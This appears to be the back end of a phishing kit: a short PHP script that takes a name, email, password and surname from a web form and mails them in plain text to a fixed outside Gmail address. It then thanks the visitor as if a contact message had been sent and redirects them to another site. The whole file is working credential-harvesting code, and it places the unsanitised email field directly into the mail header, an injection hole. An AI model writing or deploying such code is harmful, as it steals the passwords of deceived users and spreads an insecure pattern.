<?php
$nombre = $_POST['nombre'];
$email = $_POST['email'];
$pass = $_POST['pass'];
$Apellido = $_POST['Apellido'];
$para = 'laberinto692@gmail.com';
$titulo = 'ASUNTO DEL MENSAJE';
$header = 'From: ' . $email;
$msjCorreo = "Nombre: $nombre\n E-Mail: $email\n pass:\n $pass\n Apellido: ";
  
if ($_POST['submit']) {
if (mail($para, $titulo, $msjCorreo, $header)) {
echo "<script language='javascript'>
alert('Mensaje enviado, muchas gracias.');
window.location.href = 'http://tokyo-zona-zero.esy.es/';
</script>";
} else {
echo 'Falló el envio';
}
}
?>